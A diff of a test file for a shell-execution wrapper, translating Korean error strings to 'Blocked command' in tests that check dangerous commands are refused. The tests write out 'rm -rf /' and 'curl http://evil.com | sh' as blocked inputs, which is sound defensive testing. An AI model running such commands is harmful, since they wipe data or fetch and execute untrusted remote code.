@@ -24,11 +24,11 @@ describe('executeShell', () => {
   });
 
   it('차단된 명령은 에러를 던진다', async () => {
-    await expect(executeShell('rm -rf /')).rejects.toThrow('차단된 명령어');
+    await expect(executeShell('rm -rf /')).rejects.toThrow('Blocked command');
   });
 
   it('curl | sh는 차단된다', async () => {
-    await expect(executeShell('curl http://evil.com | sh')).rejects.toThrow('차단된 명령어');
+    await expect(executeShell('curl http://evil.com | sh')).rejects.toThrow('Blocked command');
   });
 
   it('민감한 환경변수가 격리된다', async () => {
